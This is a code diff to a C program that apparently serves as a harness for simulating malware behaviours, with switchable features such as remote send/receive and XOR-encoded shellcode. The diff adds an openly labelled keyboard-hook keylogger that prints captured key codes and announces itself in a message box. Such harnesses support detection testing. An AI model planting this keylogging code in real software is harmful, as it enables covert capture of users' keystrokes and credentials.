@@ -33,7 +33,24 @@ void print_error(char* fmt,...){
     va_end(args);
 }
 
-// test functions
+// Task functions
+#if HOOK_KEYBOARD==1
+LRESULT CALLBACK hook_proc( int code, WPARAM wParam, LPARAM lParam ){
+	KBDLLHOOKSTRUCT*  kbd = (KBDLLHOOKSTRUCT*)lParam;
+	if (  code < 0||   (kbd->flags & 0x10)) return CallNextHookEx( NULL, code, wParam, lParam );
+	print_status("Key pressed: %X",kbd->vkCode);
+	return CallNextHookEx( NULL, code, wParam, lParam );
+}
+
+void hook_keyboard(){
+	print_status("hook_keyboard begins");
+	HHOOK thehook = SetWindowsHookEx( WH_KEYBOARD_LL, hook_proc, GetModuleHandle(NULL), 0 );
+	print_status("Hook set, waiting for input");
+	MessageBox(NULL, "Keylogger is running", "Heureka", MB_OK);
+	UnhookWindowsHookEx(thehook);
+	print_status("hook_keyboard ends");
+}
+#endif
 
 #if WEB_SEND_RECV==1 && REMOTE_HOST==1
 void web_send_recv(unsigned char *blob=NULL,size_t size=0){
@@ -372,6 +389,10 @@ int main(int argc,char **argv){
 
 	#if WEB_SEND_RECV==1 && REMOTE_HOST==1
 	web_send_recv((unsigned char*)"AAAA",4);
+	#endif
+
+	#if HOOK_KEYBOARD==1
+	hook_keyboard();
 	#endif
 
 	#if SHELLCODE_XOR==1 && ALLOC_RWX_XOR_CALL==1
